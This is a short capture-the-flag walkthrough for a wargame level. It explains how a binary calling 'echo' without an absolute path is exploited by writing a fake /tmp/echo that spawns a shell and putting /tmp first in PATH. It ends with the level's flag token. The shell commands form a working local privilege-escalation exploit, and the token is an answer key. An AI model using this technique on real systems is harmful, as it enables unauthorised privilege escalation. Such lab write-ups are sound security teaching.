# Level03 Walkthrough

## Overview

In this level, the goal is to exploit a misconfigured environment where a binary relies on external commands without using absolute paths. This allows us to hijack execution by manipulating the `PATH` variable.

## Walkthrough

### 1. Identify the vulnerability

The `level03` binary calls system commands (like `echo`) without specifying their full path. This means the system will search for the command in directories listed in the `PATH` environment variable.

### 2. Create a malicious replacement

We create our own version of the `echo` command that spawns a shell:

```bash id="v3k8qp"
echo '#!/bin/sh' > /tmp/echo
echo '/bin/sh' >> /tmp/echo
chmod +x /tmp/echo
```

### 3. Hijack the PATH

By placing `/tmp` at the beginning of the `PATH`, our malicious script will be executed instead of the real `echo`:

```bash id="a7m2zx"
export PATH=/tmp:$PATH
```

### 4. Execute the vulnerable binary

Run the program:

```bash id="q9r4ln"
./level03
```

This triggers our fake `echo`, giving us a shell with elevated privileges.

### 5. Retrieve the flag

Once the shell is spawned:

```bash id="s6t1we"
getflag
```

## Token

```id="k2p8dx"
qi0maab88jeaj46qoumi7maus
```

